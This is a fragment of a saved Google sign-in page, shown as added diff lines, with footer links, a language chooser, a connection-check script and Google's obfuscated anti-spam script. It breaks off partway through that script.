+  <a id="account-chooser-link" href="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fdocs.google.com%2FnonceSigner%3Fnonce%3Dfn057heo1kvvs%26continue%3Dhttps%3A%2F%2Fdoc-08-ak-docs.googleusercontent.com%2Fdocs%2Fsecuresc%2Ft8jfo3ir8mgbi1cdcngida0ptli8vf4a%2Ff0ph1hisclr4hfan8tt35a1jml572bee%2F1462464000000%2F11436351527929101308%2F11436351527929101308%2F0B28o-MfxY-x4Vm5xanIxd2dsRkk%3Fe%253Ddownload%26hash%3Dgsmluj5goane5jaull3mvs1gvdk2ba32&amp;hl=en&amp;service=writely">
+  Sign in with a different account
+  </a>
+  </p>
+<p class="tagline">
+  One Google Account for everything Google
+</p>
+<div class="logo-strip"></div>
+</div>
+  </div>
+  <div class="google-footer-bar">
+  <div class="footer content clearfix">
+  <ul id="footer-list">
+  <li>
+  <a href="https://www.google.com/intl/en/about" target="_blank">
+  About Google
+  </a>
+  </li>
+  <li>
+  <a href="https://accounts.google.com/TOS?loc=BD&hl=en&privacy=true" target="_blank">
+  Privacy
+  </a>
+  </li>
+  <li>
+  <a href="https://accounts.google.com/TOS?loc=BD&hl=en" target="_blank">
+  Terms
+  </a>
+  </li>
+  <li>
+  <a href="http://www.google.com/support/accounts?hl=en" target="_blank">
+  Help
+  </a>
+  </li>
+  </ul>
+  <div id="lang-vis-control" style="display: none">
+  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
+  <label for="lang-chooser"><img src="//ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png" alt="Change language"></label>
+  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
+  <option value="af"
+                 >
+  ‪Afrikaans‬
+  </option>
+  <option value="az"
+                 >
+  ‪azərbaycan dili‬
+  </option>
+  <option value="ms"
+                 >
+  ‪Bahasa Melayu‬
+  </option>
+  <option value="ca"
+                 >
+  ‪català‬
+  </option>
+  <option value="cs"
+                 >
+  ‪Čeština‬
+  </option>
+  <option value="da"
+                 >
+  ‪Dansk‬
+  </option>
+  <option value="de"
+                 >
+  ‪Deutsch‬
+  </option>
+  <option value="et"
+                 >
+  ‪eesti‬
+  </option>
+  <option value="en-GB"
+                 >
+  ‪English (United Kingdom)‬
+  </option>
+  <option value="en"
+                
+                  selected="selected"
+                 >
+  ‪English (United States)‬
+  </option>
+  <option value="es"
+                 >
+  ‪Español (España)‬
+  </option>
+  <option value="es-419"
+                 >
+  ‪Español (Latinoamérica)‬
+  </option>
+  <option value="eu"
+                 >
+  ‪euskara‬
+  </option>
+  <option value="fil"
+                 >
+  ‪Filipino‬
+  </option>
+  <option value="fr-CA"
+                 >
+  ‪Français (Canada)‬
+  </option>
+  <option value="fr"
+                 >
+  ‪Français (France)‬
+  </option>
+  <option value="gl"
+                 >
+  ‪galego‬
+  </option>
+  <option value="hr"
+                 >
+  ‪Hrvatski‬
+  </option>
+  <option value="in"
+                 >
+  ‪Indonesia‬
+  </option>
+  <option value="zu"
+                 >
+  ‪isiZulu‬
+  </option>
+  <option value="is"
+                 >
+  ‪íslenska‬
+  </option>
+  <option value="it"
+                 >
+  ‪Italiano‬
+  </option>
+  <option value="sw"
+                 >
+  ‪Kiswahili‬
+  </option>
+  <option value="lv"
+                 >
+  ‪latviešu‬
+  </option>
+  <option value="lt"
+                 >
+  ‪lietuvių‬
+  </option>
+  <option value="hu"
+                 >
+  ‪magyar‬
+  </option>
+  <option value="nl"
+                 >
+  ‪Nederlands‬
+  </option>
+  <option value="no"
+                 >
+  ‪norsk‬
+  </option>
+  <option value="pl"
+                 >
+  ‪polski‬
+  </option>
+  <option value="pt"
+                 >
+  ‪Português (Brasil)‬
+  </option>
+  <option value="pt-PT"
+                 >
+  ‪português (Portugal)‬
+  </option>
+  <option value="ro"
+                 >
+  ‪română‬
+  </option>
+  <option value="sk"
+                 >
+  ‪Slovenčina‬
+  </option>
+  <option value="sl"
+                 >
+  ‪slovenščina‬
+  </option>
+  <option value="fi"
+                 >
+  ‪Suomi‬
+  </option>
+  <option value="sv"
+                 >
+  ‪Svenska‬
+  </option>
+  <option value="vi"
+                 >
+  ‪Tiếng Việt‬
+  </option>
+  <option value="tr"
+                 >
+  ‪Türkçe‬
+  </option>
+  <option value="el"
+                 >
+  ‪Ελληνικά‬
+  </option>
+  <option value="bg"
+                 >
+  ‪български‬
+  </option>
+  <option value="mn"
+                 >
+  ‪монгол‬
+  </option>
+  <option value="ru"
+                 >
+  ‪Русский‬
+  </option>
+  <option value="sr"
+                 >
+  ‪српски‬
+  </option>
+  <option value="uk"
+                 >
+  ‪Українська‬
+  </option>
+  <option value="ka"
+                 >
+  ‪ქართული‬
+  </option>
+  <option value="hy"
+                 >
+  ‪հայերեն‬
+  </option>
+  <option value="iw"
+                 >
+  ‫עברית‬‎
+  </option>
+  <option value="ur"
+                 >
+  ‫اردو‬‎
+  </option>
+  <option value="ar"
+                 >
+  ‫العربية‬‎
+  </option>
+  <option value="fa"
+                 >
+  ‫فارسی‬‎
+  </option>
+  <option value="am"
+                 >
+  ‪አማርኛ‬
+  </option>
+  <option value="ne"
+                 >
+  ‪नेपाली‬
+  </option>
+  <option value="mr"
+                 >
+  ‪मराठी‬
+  </option>
+  <option value="hi"
+                 >
+  ‪हिन्दी‬
+  </option>
+  <option value="bn"
+                 >
+  ‪বাংলা‬
+  </option>
+  <option value="gu"
+                 >
+  ‪ગુજરાતી‬
+  </option>
+  <option value="ta"
+                 >
+  ‪தமிழ்‬
+  </option>
+  <option value="te"
+                 >
+  ‪తెలుగు‬
+  </option>
+  <option value="kn"
+                 >
+  ‪ಕನ್ನಡ‬
+  </option>
+  <option value="ml"
+                 >
+  ‪മലയാളം‬
+  </option>
+  <option value="si"
+                 >
+  ‪සිංහල‬
+  </option>
+  <option value="th"
+                 >
+  ‪ไทย‬
+  </option>
+  <option value="lo"
+                 >
+  ‪ລາວ‬
+  </option>
+  <option value="km"
+                 >
+  ‪ខ្មែរ‬
+  </option>
+  <option value="ko"
+                 >
+  ‪한국어‬
+  </option>
+  <option value="zh-HK"
+                 >
+  ‪中文（香港）‬
+  </option>
+  <option value="ja"
+                 >
+  ‪日本語‬
+  </option>
+  <option value="zh-CN"
+                 >
+  ‪简体中文‬
+  </option>
+  <option value="zh-TW"
+                 >
+  ‪繁體中文‬
+  </option>
+  </select>
+  </span>
+  </div>
+  </div>
+</div>
+  </div>
+  <script>
+  (function(){
+  var splitByFirstChar = function(toBeSplit, splitChar) {
+  var index = toBeSplit.indexOf(splitChar);
+  if (index >= 0) {
+  return [toBeSplit.substring(0, index),
+  toBeSplit.substring(index + 1)];
+  }
+  return [toBeSplit];
+  }
+  var langChooser_parseParams = function(paramsSection) {
+  if (paramsSection) {
+  var query = {};
+  var params = paramsSection.split('&');
+  for (var i = 0; i < params.length; i++) {
+              var param = splitByFirstChar(params[i], '=');
+              if (param.length == 2) {
+                query[param[0]] = param[1];
+              }
+            }
+            return query;
+          }
+          return {};
+        }
+        var appendHiddenParams = function(query) {
+          var loginForm = document.getElementById('gaia_loginform');
+          if (loginForm) {
+            var loginInputs = loginForm.getElementsByTagName('input');
+            for (var i = 0, input; input = loginInputs[i]; i++) {
+              if (input.type == 'hidden' && input.value && !query[input.name]) {
+                query[input.name] = input.value;
+              }
+            }
+          }
+        }
+        var post = function(path, params) {
+          var form = document.createElement('form');
+          form.setAttribute('method', 'post');
+          form.setAttribute('action', path);
+
+          for (var key in params) {
+            if (params.hasOwnProperty(key)) {
+              var hiddenField = document.createElement('input');
+              hiddenField.setAttribute('type', 'hidden');
+              hiddenField.setAttribute('name', key);
+              hiddenField.setAttribute('value', params[key]);
+
+              form.appendChild(hiddenField);
+            }
+          }
+
+          document.body.appendChild(form);
+          form.submit();
+        }
+        var langChooser_getParamStr = function(params) {
+          var paramsStr = [];
+          for (var a in params) {
+            paramsStr.push(a + "=" + params[a]);
+          }
+          return paramsStr.join('&');
+        }
+        var langChooser_currentUrl = window.location.href;
+        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
+        var langChooser_currentPath = match[1];
+        var langChooser_params = langChooser_parseParams(match[3]);
+        var langChooser_fragment = match[5];
+
+        var langChooser = document.getElementById('lang-chooser');
+        var langChooserWrap = document.getElementById('lang-chooser-wrap');
+        var langVisControl = document.getElementById('lang-vis-control');
+        if (langVisControl && langChooser) {
+          langVisControl.style.display = 'inline';
+          langChooser.onchange = function() {
+            langChooser_params['lp'] = 1;
+            langChooser_params['hl'] = encodeURIComponent(this.value);
+            var hiddenEmailInput = document.getElementById('Email-hidden');
+            if (hiddenEmailInput) {
+              // If we are in password separation on password page, post to
+              // /AccountLoginInfo.
+              appendHiddenParams(langChooser_params);
+              langChooser_params['Email'] = hiddenEmailInput.value;
+              post('/AccountLoginInfo', langChooser_params);
+            } else {
+              var paramsStr = langChooser_getParamStr(langChooser_params);
+              var newHref = langChooser_currentPath + "?" + paramsStr;
+              if (langChooser_fragment) {
+                newHref = newHref + "#" + langChooser_fragment;
+              }
+              window.location.href = newHref;
+            }
+          };
+        }
+      })();
+    </script>
+<script type="text/javascript">
+  var gaia_attachEvent = function(element, event, callback) {
+  if (element.addEventListener) {
+  element.addEventListener(event, callback, false);
+  } else if (element.attachEvent) {
+  element.attachEvent('on' + event, callback);
+  }
+  };
+</script>
+  <script>var G,Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gf=function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Gd(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Ge(a,b).push(d);return d},Gg=function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Gd(b);return d};a.attachEvent("on"+b,d);Ge(a,b).push(d);return d},Gh;Gh=window.addEventListener?Gf:window.attachEvent?Gg:void 0;var Gd=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1};
+var Ge=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gi=function(){try{return new XMLHttpRequest}catch(c){for(var a=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],b=0;b<a.length;b++)try{return new ActiveXObject(a[b])}catch(d){}}return null},Gj=function(){this.request=Gi();this.parameters={}};
+Gj.prototype.send=function(a,b){var c=[],d;for(d in this.parameters){var e=this.parameters[d];c.push(d+"="+encodeURIComponent(e))}var c=c.join("&"),f=this.request;f.open("POST",a,!0);f.setRequestHeader("Content-type","application/x-www-form-urlencoded");f.onreadystatechange=function(){4==f.readyState&&b({status:f.status,text:f.responseText})};f.send(c)};
+Gj.prototype.get=function(a,b){var c=this.request;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gl=function(a){this.g=a;this.v=this.o();if(null==this.g)throw new Gk("Empty module name");};G=Gl.prototype;G.o=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
+G.j=function(a,b,c){var d=this.v,e=this.g||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gj;d.parameters={};try{var e=this.j(a,b,c);d.get(e,function(){})}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};
+G.warn=function(a,b){this.send("WARN",a,b)};G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gk=function(){};var Gm=Gm||new Gl("uri"),Gn=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Go=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gp=function(a,b){var c=b.match(Gn)[1]||null,d,e=b.match(Gn)[3]||null;d=e&&decodeURIComponent(e);e=Number(b.match(Gn)[4]||null)||null;if(!c||!d)return Gm.error("Invalid origin Exception",[String(b)]),!1;e||(e=Go(c));var f=a.match(Gn)[1]||null;if(!f||f.toLowerCase()!=
+c.toLowerCase())return!1;c=(c=a.match(Gn)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return!1;(d=Number(a.match(Gn)[4]||null)||null)||(d=Go(f));return e==d};var Gq=Gq||new Gl("check_connection"),Gr=null,Gs=null,Gt=null,Gu=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gu.prototype;G.i=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Gq.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.h=function(a){return this.i(a,Gs)};G.w=function(a){return this.i(a,Gt)};G.m=function(a){a=a.match("^([^:]+):(\\d*):(\\d?)$");return!a||3>a.length?null:a[1]};
+G.u=function(a,b){if(!Gp(this.c,a))return!1;if(this.a||!b)return!0;"accessible"==b?(this.h(a),this.a=!0):this.m(b)==this.b&&(this.w(b)||this.h(a),this.a=!0);return!0};G.s=function(){var a;a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
+G.l=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.s();a.id=this.b;Gr.appendChild(a)};
+var Gv=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].u(c,b);e++);}},Gw=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gr=document.getElementById(a))?(b&&(Gs=document.getElementById(b)),c&&(Gt=document.getElementById(c)),Gs||Gt?a=!0:(Gq.error("Unable to locate the input element to storeCheckConnection result",
+["old id: "+String(b),"new id: "+String(c)]),a=!1)):(Gq.error("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Gq.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gu(a[d].iframeUri,a[d].domainSymbol));
+Gh(window,"message",Gv(c));for(d=0;d<b;d++)c[d].l()}}}},Gx=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Gq.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Gq.f(Gw);G_setPostMessageSupportFlag=Gq.f(Gx);
+</script>
+  <script>
+  window.__CHECK_CONNECTION_CONFIG = {
+  newResultElementId: 'checkConnection',
+  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\x3dhttps%3A%2F%2Faccounts.google.com\x26v\x3d490117047',domainSymbol: 'youtube'}],
+  iframeUri: '',
+  iframeOrigin: '',
+  connectivityElementId: 'dnConn',
+  iframeParentElementId: 'cc_iframe_parent',
+  postMsgSupportElementId: 'pstMsg',
+  msgContent: 'accessible'
+  };
+  G_setPostMessageSupportFlag();
+  G_checkConnectionMain();
+</script>
+  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */(function(){eval('var V=function(d,e,x,c,Q){for((x=d.split("."),c=O,x[0]in c)||!c.execScript||c.execScript("var "+x[0]);x.length&&(Q=x.shift());)x.length||void 0===e?c=c[Q]?c[Q]:c[Q]={}:c[Q]=e},O=this,u=function(d,e,x){return 2>=arguments.length?Array.prototype.slice.call(d,e):Array.prototype.slice.call(d,e,x)},K=function(d,e,x){if("object"==(e=typeof d,e))if(d){if(d instanceof Array)return"array";if(d instanceof Object)return e;if((x=Object.prototype.toString.call(d),"[object Window]")==x)return"object";if("[object Array]"==x||"number"==typeof d.length&&"undefined"!=typeof d.splice&&"undefined"!=typeof d.propertyIsEnumerable&&!d.propertyIsEnumerable("splice"))return"array";if("[object Function]"==x||"undefined"!=typeof d.call&&"undefined"!=typeof d.propertyIsEnumerable&&!d.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==e&&"undefined"==typeof d.call)return"object";return e},D,q=(new function(){},function(d,e,x,c,Q,F,U,N,p){return F=(Q=(N=n,n.prototype),U=Q.D,c=function(){return x()},p=Q.g,Q).l,x=function(d,S,B){for(d=(S=(d=c[Q.P],d===e),B=0,d&&d[Q.P]);d&&d!=F&&d!=U&&d!=N&&d!=p&&20>B;)B++,d=d[Q.P];return x[Q.X6+S+!(!d+(B+3>>3))]},c[Q.L]=function(d){x[Q.O]=d},c[Q.L](d),d=c}),X=function(d,e){(((((((((((((((((((((((((((((d.G=[],Y(d,d.I,0),Y(d,d.$,0),Y(d,d.K,0),Y)(d,d.X,[]),d).b=true,Y)(d,d.B,2048),Y(d,d.GO,d),Y(d,d.C,E(4)),Y)(d,d.T,0),Y)(d,d.v,{}),Y)(d,d.a,[]),Y)(d,d.cT,"object"==typeof window?window:O),Y(d,d.H,0),Y(d,d.U,0),Y)(d,d.u,[]),Y)(d,d.i,d.i),Y)(d,110,function(x,d,Q){(Q=(d=C(x),C(x)),Y)(x,Q,x.c(Q)*x.c(d))}),Y(d,32,function(x,d,Q,e){e=(Q=(d=C(x),C(x)),C)(x),Y(x,e,x.c(d)>>Q)}),Y(d,22,function(x,d,Q,e){(e=(d=C(x),Q=C(x),C)(x),x).c(d)[x.c(Q)]=x.c(e)}),Y(d,28,function(x,d,Q,e,U,N,p,b,S,B){if(void 0!=(e=(d=C(x),Q=T(x),""),x.G[x.R]))for(U=x.c(x.R),p=U.length,N=0;Q--;)N=(N+T(x))%p,e+=U[N];else{for(e=Array(Q),U=0;U<Q;U++)e[U]=C(x);for(N=(Q=[],U=0);U<e.length;)p=e[U++],128>p?Q[N++]=String.fromCharCode(p):191<p&&224>p?(b=e[U++],Q[N++]=String.fromCharCode((p&31)<<6|b&63)):239<p&&365>p?(b=e[U++],S=e[U++],B=e[U++],p=((p&7)<<18|(b&63)<<12|(S&63)<<6|B&63)-65536,Q[N++]=String.fromCharCode(55296+(p>>10)),Q[N++]=String.fromCharCode(56320+(p&1023))):(b=e[U++],S=e[U++],Q[N++]=String.fromCharCode((p&15)<<12|(b&63)<<6|S&63));e=Q.join("")}Y(x,d,e)}),Y)(d,46,function(d,c,e,F,U,N){if("object"==(c=(U=(F=(e=(c=C(d),C(d)),C)(d),C(d)),d).c(c),e=d.c(e),F=d.c(F),d=d.c(U),K(c))){for(N in U=[],c)U.push(N);c=U}for(U=0,N=c.length;U<N;U+=F)e(c.slice(U,U+F),d)}),Y(d,84,function(d,c){c=l(d),Y(d,c.S,c.o.apply(c.M,c.s))}),Y(d,60,function(d,c,e,F){e=(c=C(d),e=C(d),F=C(d),d.c(e)),c=d.c(c),Y(d,F,c[e])}),Y)(d,24,function(d,c,e,F){F=(e=(c=C(d),C(d)),d).c(C(d)),e=d.c(e),Y(d,c,A(d,e,F))}),Y(d,96,function(d,e,Q){Q=(e=C(d),C(d)),Y(d,Q,""+d.c(e))}),Y(d,72,function(){}),Y(d,57,function(d,e){e=C(d),d=d.c(e),d[0].removeEventListener(d[1],d[2],false)}),Y(d,126,function(){}),Y(d,2,function(d,e,Q,F){if(e=d.A.pop()){for(Q=C(d);0<Q;Q--)F=C(d),e[F]=d.G[F];e[d.X]=d.G[d.X],d.G=e}else Y(d,d.I,d.N.length)}),Y)(d,81,function(d,e,Q){(e=C(d),Q=C(d),Y)(d,Q,d.c(Q)-d.c(e))}),Y)(d,93,function(d){J(d,3)}),Y)(d,67,function(d,e,Q,F,U,N,p){(0==(F=(e=l(d),U=e.o,e.M),Q=e.s,p=Q.length,p)?N=new F[U]:1==p?N=new F[U](Q[0]):2==p?N=new F[U](Q[0],Q[1]):3==p?N=new F[U](Q[0],Q[1],Q[2]):4==p?N=new F[U](Q[0],Q[1],Q[2],Q[3]):d.g(d.m),Y)(d,e.S,N)}),Y)(d,20,function(d,e,Q){Q=(e=C(d),C(d)),Y(d,Q,d.c(Q)%d.c(e))}),Y)(d,37,function(d,e,Q,F,U){for(U=(Q=(e=C(d),T)(d),F=Array(Q),0);U<Q;U++)F[U]=C(d);Y(d,e,F)}),Y)(d,87,function(d,e,Q,F){F=(e=C(d),Q=C(d),C)(d),Y(d,F,(d.c(e)in d.c(Q))+0)}),Y)(d,99,function(d){G(d,2)}),Y(d,79,function(d){J(d,7)}),Y(d,112,function(d,e,Q){(e=C(d),Q=C(d),Y)(d,Q,function(d){return eval(d)}(d.c(e)))}),Y(d,62,function(d,e,Q){(Q=(e=C(d),C)(d),0!=d.c(e))&&Y(d,d.I,d.c(Q))}),Y)(d,50,function(d,e,Q,F){(e=C(d),Q=C(d),F=C(d),Y)(d,F,d.c(e)<<Q)}),Y(d,26,function(d){G(d,4)}),Y(d,40,function(d){z(d,2)}),Y)(d,108,function(d,e,Q,F){Q=(e=C(d),C(d)),F=C(d),Y(d,F,d.c(e)||d.c(Q))}),Y(d,66,function(d){J(d,4)}),Y)(d,114,function(d){J(d,0)}),Y(d,21,function(d,e,Q,F){(F=(e=C(d),Q=C(d),C)(d),d).c(e)>d.c(Q)&&Y(d,F,d.c(F)+1)}),Y(d,80,function(d,e,Q){Q=(e=C(d),C)(d),Y(d,Q,d.c(Q)+d.c(e))}),Y)(d,59,function(d,e,Q,F){(Q=(e=C(d),C)(d),F=C(d),d.c(e)==d.c(Q))&&Y(d,F,d.c(F)+1)}),Y(d,52,function(d){z(d,4)}),Y)(d,65,function(d,e,Q,F,U){(F=(e=(F=(Q=(e=C(d),C)(d),C)(d),d).c(e),U=d.c(C(d)),Q=d.c(Q),d.c(F)),0!==e)&&(F=A(d,F,U,e),e.addEventListener(Q,F,false),Y(d,d.H,[e,Q,F]))}),Y)(d,73,function(d,e,Q){e=(e=C(d),Q=C(d),d).G[e]&&d.c(e),Y(d,Q,e)}),Y)(d,95,function(d){G(d,1)}),Y)(d,88,function(){}),Y(d,12,function(d,e,Q){Q=(e=C(d),C(d)),e=d.c(e),Y(d,Q,K(e))}),Y)(d,51,function(d,e){e=d.c(C(d)),M(d,e)}),Y(d,105,function(d){z(d,1)}),Y(d,9,function(d,e,Q,F){(e=C(d),Q=C(d),F=C(d),Y)(d,F,d.c(e)|d.c(Q))}),w(),e)&&"!"==e.charAt(0)?d.w=e:(d.N=window.atob?g(window.atob(e)):null,d.N&&d.N.length?(d.A=[],d.l()):d.g(d.V))},r=function(d,e,x,c){if(8192>=d.length)return String.fromCharCode.apply(null,d);for(e=(x=0,"");x<d.length;x+=8192)c=u(d,x,x+8192),e+=String.fromCharCode.apply(null,c);return e},f=function(d,e,x,c){return c=((x=d.c(d.I),d.N&&x<d.N.length)?(Y(d,d.I,d.N.length),M(d,e)):Y(d,d.I,e),d).l(),Y(d,d.I,x),c},Y=function(d,e,x){if(e==d.I||e==d.$)if(d.G[e])d.G[e][d.L](x);else d.G[e]=P(d,x);else if(e!=d.a&&e!=d.C&&e!=d.X||!d.G[e])d.G[e]=q(x,d.c);e==d.U&&(d.J=void 0,Y(d,d.I,d.c(d.I)+4))},w=function(d){for(d=0;64>d;++d);},I=function(d,e,x,c,Q){for(e=[],c=x=0;c<d.length;c++)Q=d.charCodeAt(c),128>Q?e[x++]=Q:(2048>Q?e[x++]=Q>>6|192:(55296==(Q&64512)&&c+1<d.length&&56320==(d.charCodeAt(c+1)&64512)?(Q=65536+((Q&1023)<<10)+(d.charCodeAt(++c)&1023),e[x++]=Q>>18|240,e[x++]=Q>>12&63|128):e[x++]=Q>>12|224,e[x++]=Q>>6&63|128),e[x++]=Q&63|128);return e},n=function(d){try{X(this,d)}catch(e){R(this,e)}},v=(n.prototype.c=function(d,e){if(void 0===(e=this.G[d],e))throw this.g(this.Z,0,d),this.j;return e()},function(d,e,x,c,Q,F){for(c=((e=(Q=d.c(e),e)==d.C?function(e,x,c,F){if((c=(x=Q.length,x-4>>3),Q.iD)!=c){F=[0,(c=(Q.iD=c,(c<<3)-4),0),0,d.c(d.T)];try{Q.qt=L(h(Q,c),h(Q,c+4),F)}catch(S){throw S;}}Q.push(Q.qt[x&7]^e)}:function(d){Q.push(d)},c)&&e(c&255),F=0,x.length);F<c;F++)e(x[F])}),R=((D=n.prototype,D).GO=249,function(d,e){d.w=("E:"+e.message+":"+e.stack).slice(0,2048)}),T=function(d,e){return(e=C(d),e&128)&&(e=e&127|C(d)<<7),e},h=function(d,e){return d[e]<<24|d[e+1]<<16|d[e+2]<<8|d[e+3]},l=(D.cT=(D.Nt=(D.$=173,15),145),function(d,e,x,c,Q,F){for(Q=(c=(((x=(e={},C)(d),e).S=C(d),e).s=[],C)(d)-1,C(d)),F=0;F<c;F++)e.s.push(C(d));for((e.o=d.c(x),e).M=d.c(Q);c--;)e.s[c]=d.c(e.s[c]);return e}),P=(D.V=(D.H=(D.O=36,219),17),D.Y=233,function(d,e,x,c){return x=(c=function(){return e},function(){return c()}),x[d.L]=function(d){e=d},x}),m=(D.u=129,function(d,e,x,c){for(c=e-1,x=[];0<=c;c--)x[e-1-c]=d>>8*c&255;return x}),E=(((D.B=(((D.v=134,D).gX=153,D.kU=10,D).K=170,191),D.U=176,n).prototype.$U=function(d,e,x,c){if(3==d.length){for(x=0;3>x;x++)e[x]+=d[x];for(x=0,c=[13,8,13,12,16,5,3,10,15];9>x;x++)e[3](e,x%3,c[x])}},D).I=149,D.P="caller",function(d,e){for(e=Array(d);d--;)e[d]=255*Math.random()|0;return e}),L=(D.C=237,function(d,e,x,c){try{for(c=0;79669387488!=c;)d+=(e<<4^e>>>5)+e^c+x[c&3],c+=2489668359,e+=(d<<4^d>>>5)+d^c+x[c>>>11&3];return[d>>>24,d>>16&255,d>>8&255,d&255,e>>>24,e>>16&255,e>>8&255,e&255]}catch(Q){throw Q;}}),A=(D.X=155,function(d,e,x,c){return function(){if(!c||d.b)return Y(d,d.IW,arguments),Y(d,d.v,x),f(d,e)}}),M=((n.prototype.g=(((D.Z=30,D.L="toString",D).IW=217,D.j={},D.T=133,D.W=33,D).a=236,function(d,e,x,c){(e=(((d=(c=this.c(this.$),[d,c>>8&255,c&255]),void 0)!=x&&d.push(x),0)==this.c(this.X).length&&(this.G[this.X]=void 0,Y(this,this.X,d)),x="",e&&(e.message&&(x+=e.message),e.stack&&(x+=":"+e.stack)),this).c(this.B),3)<e&&(x=x.slice(0,e-3),e-=x.length+3,x=I(x.replace(/\\r\\n/g,"\\n")),v(this,this.C,m(x.length,2).concat(x),this.aW)),Y(this,this.B,e)}),D.h=21,D).CE=false,function(d,e){((d.A.push(d.G.slice()),d).G[d.I]=void 0,Y)(d,d.I,e)}),C=(D.X6=34,function(d,e,x){if(!((e=d.c(d.I),e)in d.N))throw d.g(d.F),d.j;return((void 0==d.J&&(d.J=h(d.N,e-4),d.f=void 0),d.f!=e>>3&&(d.f=e>>3,x=[0,0,0,d.c(d.U)],d.rX=L(d.J,d.f,x)),Y)(d,d.I,e+1),d.N)[e]^d.rX[e%8]}),g=(D=((((D.i=143,n).prototype.nE=function(d,e){(e.push(d[0]<<24|d[1]<<16|d[2]<<8|d[3]),e).push(d[4]<<24|d[5]<<16|d[6]<<8|d[7]),e.push(d[8]<<24|d[9]<<16|d[10]<<8|d[11])},n.prototype.Em=function(d,e,x,c){try{c=d[(e+2)%3],d[e]=d[e]-d[(e+1)%3]-c^(1==e?c<<x:c>>>x)}catch(Q){throw Q;}},D.F=31,D).aW=12,D).m=22,D.R=187,n).prototype,function(d,e,x,c,Q){for(c=(e=[],x=0);c<d.length;c++){for(Q=d.charCodeAt(c);255<Q;)e[x++]=Q&255,Q>>=8;e[x++]=Q}return e}),J=(D.sm=function(d){return(d=window.performance)&&d.now?function(){return d.now()|0}:function(){return+new Date}}(),function(d,e,x,c,Q,F){((Q=(F=(Q=(c=e&3,x=e&4,C)(d),C)(d),d).c(Q),x)&&(Q=I((""+Q).replace(/\\r\\n/g,"\\n"))),c)&&v(d,F,m(Q.length,2)),v(d,F,Q)}),z=function(d,e,x,c){for(c=(x=C(d),0);0<e;e--)c=c<<8|C(d);Y(d,x,c)},G=(D.BT=function(d,e){return(e=this.D(),d)&&d(e),e},function(d,e,x,c){(c=(x=C(d),C(d)),v)(d,c,m(d.c(x),e))});((((D.LE=function(d,e,x){return d^((e=((e^=e<<13,e^=e>>17,e)^e<<5)&x)||(e=1),e)},D).D=function(d,e,x,c,Q,F,U,N,p,b){if(this.w)return 